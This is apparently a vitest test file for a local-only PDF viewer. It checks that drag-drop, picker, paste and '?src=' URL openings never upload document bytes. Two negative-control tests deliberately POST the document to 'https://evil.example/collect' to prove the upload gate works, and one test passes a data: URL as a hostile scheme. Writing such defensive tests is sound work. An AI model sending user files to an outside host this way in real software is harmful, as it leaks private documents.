import { afterEach, describe, expect, it } from "vitest";
import { type Intake, collectingSink, planIntake, runIntake } from "./handoff-flow.js";
import type { HandoffFile } from "./handoff.js";
import { type RequestRecorder, installRequestRecorder } from "./no-upload.js";

/**
 * SL-4.WEB.03 DoD: "Drag-drop, file picker, paste, and `?src=` URL opening — all
 * local. The one thing this app must never do is upload a document, and a CI
 * test asserts no request body ever contains document bytes."
 *
 * The proof is mechanical rather than declarative: a recorder is installed over
 * the live `fetch`, each path is driven through {@link runIntake}, and every
 * request the run actually issued is inspected. The negative-control legs at
 * the bottom upload the same bytes on purpose — if those did not fail the gate,
 * the passing legs would mean nothing.
 */

const PDF = new TextEncoder().encode(
	"%PDF-1.7\nSelis WEB.03: local document bytes that must never leave the device.\n%%EOF\n",
);

function file(name: string, size = PDF.length): HandoffFile {
	return { name, type: "application/pdf", size };
}

/** A standalone `ArrayBuffer` copy, which is what `Response` accepts as a body. */
function bufferOf(bytes: Uint8Array): ArrayBuffer {
	return bytes.slice().buffer as ArrayBuffer;
}

/** Options for the range-serving test double. */
interface ServerOptions {
	/** Honour `Range` with 206 responses, or ignore it and send 200 + the lot. */
	readonly ranges: boolean;
	/** Fail the request outright, as a dead or refusing origin would. */
	readonly fail?: boolean;
	/** Answer with this status instead (e.g. 404, 403). */
	readonly status?: number;
}

/** A `fetch` that serves `bytes` locally — the origin side of a `?src=` open. */
function serve(bytes: Uint8Array, options: ServerOptions): typeof fetch {
	return (async (_input: RequestInfo | URL, init?: RequestInit) => {
		if (options.fail === true) {
			throw new TypeError("network unreachable");
		}
		if (options.status !== undefined) {
			return new Response("nope", { status: options.status });
		}
		const range = new Headers(init?.headers).get("Range") ?? "";
		const match = /^bytes=(\d+)-(\d+)$/.exec(range);
		if (options.ranges && match !== null) {
			const start = Number(match[1]);
			const end = Math.min(Number(match[2]), bytes.length - 1);
			return new Response(bufferOf(bytes.subarray(start, end + 1)), {
				status: 206,
				headers: { "Content-Range": `bytes ${start}-${end}/${bytes.length}` },
			});
		}
		return new Response(bufferOf(bytes), {
			status: 200,
			headers: { "Content-Length": String(bytes.length) },
		});
	}) as typeof fetch;
}

const realFetch = globalThis.fetch;
let recorder: RequestRecorder | null = null;

/** Install the CI gate over `fetch` (which the intake paths resolve lazily). */
function gate(serveBytes: typeof fetch | null): RequestRecorder {
	if (serveBytes !== null) {
		globalThis.fetch = serveBytes;
	}
	recorder = installRequestRecorder();
	return recorder;
}

afterEach(() => {
	recorder?.restore();
	recorder = null;
	globalThis.fetch = realFetch;
});

describe("drag-and-drop opens locally, with no request at all", () => {
	it("hands the Worker a Blob handle and never touches the network", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const result = await runIntake({
			path: "drop",
			dataTransfer: { files: [file("report.pdf"), file("scan.png", 10)] },
		});
		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}
		expect(result.opens).toHaveLength(1);
		const open = result.opens[0];
		expect(open?.source).toEqual({ kind: "blob", sourceId: "b1" });
		expect(open?.delivery).toEqual({ via: "register-blob", sourceId: "b1" });
		expect(open?.downloaded).toBe(0);
		expect(open?.request).toEqual({
			v: 1,
			id: 1,
			op: "open",
			src: { kind: "blob", sourceId: "b1" },
			budget: { surface: "viewer" },
		});
		expect(result.rejected).toHaveLength(1);
		expect(await seen.settle()).toHaveLength(0);
	});
});

describe("the file picker opens locally, one handle per accepted file", () => {
	it("numbers the requests and keeps the non-PDF out", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const result = await runIntake({
			path: "picker",
			files: [file("a.pdf"), file("b.pdf"), file("notes.txt")],
		});
		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}
		expect(result.opens.map((open) => open.id)).toEqual([1, 2]);
		expect(result.opens.map((open) => open.source)).toEqual([
			{ kind: "blob", sourceId: "b1" },
			{ kind: "blob", sourceId: "b2" },
		]);
		expect(result.rejected[0]).toMatch("notes.txt");
		expect(await seen.settle()).toHaveLength(0);
	});
});

describe("paste opens locally", () => {
	it("takes the clipboard file and opens it without a request", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const result = await runIntake({
			path: "paste",
			clipboardData: { files: [file("pasted.pdf")] },
		});
		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}
		expect(result.opens[0]?.name).toBe("pasted.pdf");
		expect(result.opens[0]?.downloaded).toBe(0);
		expect(await seen.settle()).toHaveLength(0);
	});

	it("rejects an empty clipboard without opening anything", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const result = await runIntake({ path: "paste", clipboardData: { files: [] } });
		expect(result).toEqual({ ok: true, opens: [], rejected: [] });
		expect(await seen.settle()).toHaveLength(0);
	});
});

describe("?src= URL opening downloads into local memory, never out of it", () => {
	it("pulls the document with bodyless range GETs and keeps every byte local", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const sink = collectingSink();
		const result = await runIntake(
			{ path: "url", href: "https://app.selis/viewer?src=https://example.org/r.pdf" },
			{ sink, chunkBytes: 16 },
		);
		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}
		expect(result.opens[0]?.source).toEqual({
			kind: "http-range",
			url: "https://example.org/r.pdf",
		});
		expect(result.opens[0]?.name).toBe("r.pdf");
		// The bytes arrived in this process, whole and in order.
		expect(sink.bytes()).toEqual(PDF);
		expect(result.opens[0]?.downloaded).toBe(PDF.length);
		const recorded = await seen.settle();
		expect(recorded.length).toBeGreaterThan(1);
		for (const request of recorded) {
			expect(request.method).toBe("GET");
			expect(request.body).toBeNull();
			expect(request.url).toBe("https://example.org/r.pdf");
		}
		await expect(seen.assertNoUpload([PDF])).resolves.toBeUndefined();
	});

	it("copes with an origin that ignores Range and sends the whole document", async () => {
		const seen = gate(serve(PDF, { ranges: false }));
		const sink = collectingSink();
		const result = await runIntake(
			{ path: "url", href: "https://app.selis/viewer?src=https://example.org/r.pdf" },
			{ sink },
		);
		expect(result.ok).toBe(true);
		if (!result.ok) {
			return;
		}
		expect(sink.bytes()).toEqual(PDF);
		const recorded = await seen.settle();
		expect(recorded).toHaveLength(1);
		expect(recorded[0]?.body).toBeNull();
		await expect(seen.assertNoUpload([PDF])).resolves.toBeUndefined();
	});

	it("refuses a hostile scheme and never issues a request for it", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const hostile: Intake = {
			path: "url",
			href: "https://app.selis/viewer?src=data:application/pdf;base64,JVBERi0=",
		};
		const result = await runIntake(hostile);
		expect(result.ok).toBe(false);
		expect(await seen.settle()).toHaveLength(0);
	});

	it("reports a refusing origin instead of falling back to a server", async () => {
		const seen = gate(serve(PDF, { ranges: true, status: 403 }));
		const result = await runIntake({
			path: "url",
			href: "https://app.selis/viewer?src=https://example.org/r.pdf",
		});
		expect(result).toEqual({ ok: false, reason: "range fetch returned HTTP 403" });
		const recorded = await seen.settle();
		expect(recorded).toHaveLength(1);
		expect(recorded[0]?.body).toBeNull();
		await expect(seen.assertNoUpload([PDF])).resolves.toBeUndefined();
	});

	it("reports a dead network rather than retrying anywhere else", async () => {
		gate(serve(PDF, { ranges: true, fail: true }));
		const result = await runIntake({
			path: "url",
			href: "https://app.selis/viewer?src=https://example.org/r.pdf",
		});
		expect(result.ok).toBe(false);
		if (result.ok) {
			return;
		}
		expect(result.reason).toMatch(/range fetch failed/);
	});

	it("refuses to truncate a document past the byte cap", async () => {
		gate(serve(PDF, { ranges: false }));
		const sink = collectingSink();
		const result = await runIntake(
			{ path: "url", href: "https://app.selis/viewer?src=https://example.org/r.pdf" },
			{ sink, maxRangeBytes: 8 },
		);
		expect(result.ok).toBe(false);
		if (result.ok) {
			return;
		}
		expect(result.reason).toMatch(/exceeds the 8 byte cap/);
		expect(sink.bytes()).toEqual(new Uint8Array(0));
	});
});

describe("the DoD itself: no request body ever carries document bytes", () => {
	it("drives all four paths through the live gate and finds no upload", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const sink = collectingSink();
		const intakes: Intake[] = [
			{ path: "drop", dataTransfer: { files: [file("drop.pdf")] } },
			{ path: "picker", files: [file("pick.pdf")] },
			{ path: "paste", clipboardData: { files: [file("paste.pdf")] } },
			{ path: "url", href: "https://app.selis/viewer?src=https://example.org/r.pdf" },
		];
		for (const intake of intakes) {
			const result = await runIntake(intake, { sink, chunkBytes: 24 });
			expect(result.ok, intake.path).toBe(true);
		}
		const recorded = await seen.settle();
		// Non-vacuous: the run really did reach the network (the `?src=` path),
		// so "no upload" is an observation about live requests, not an absence
		// of evidence.
		expect(recorded.length).toBeGreaterThan(0);
		for (const request of recorded) {
			expect(request.body, request.url).toBeNull();
			expect(request.method, request.url).toBe("GET");
		}
		await expect(seen.assertNoUpload([PDF])).resolves.toBeUndefined();
		expect(sink.bytes()).toEqual(PDF);
	});

	it("negative control: the same gate catches a deliberate upload", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		await fetch("https://evil.example/collect", { method: "POST", body: PDF });
		await expect(seen.assertNoUpload([PDF])).rejects.toThrow(/upload detected/);
	});

	it("negative control: a multipart upload of the same file is caught too", async () => {
		const seen = gate(serve(PDF, { ranges: true }));
		const form = new FormData();
		form.set("file", new Blob([PDF], { type: "application/pdf" }), "report.pdf");
		await fetch("https://evil.example/collect", { method: "POST", body: form });
		await expect(seen.assertNoUpload([PDF])).rejects.toThrow(/upload detected/);
	});
});

describe("planIntake stays local by construction", () => {
	it("plans without a network, and names the source for each path", () => {
		const drop = planIntake({ path: "drop", dataTransfer: { files: [file("a.pdf")] } });
		expect(drop.ok).toBe(true);
		const url = planIntake({ path: "url", href: "https://app.selis/v?src=https://x.test/a.pdf" });
		expect(url.ok).toBe(true);
		if (!drop.ok || !url.ok) {
			return;
		}
		expect(drop.opens[0]?.delivery.via).toBe("register-blob");
		expect(url.opens[0]?.delivery).toEqual({
			via: "fetch-ranges",
			url: "https://x.test/a.pdf",
		});
	});

	it("rejects a ?src= with no parameter rather than opening something else", () => {
		const plan = planIntake({ path: "url", href: "https://app.selis/viewer" });
		expect(plan).toEqual({ ok: false, reason: "no ?src= parameter" });
	});
});
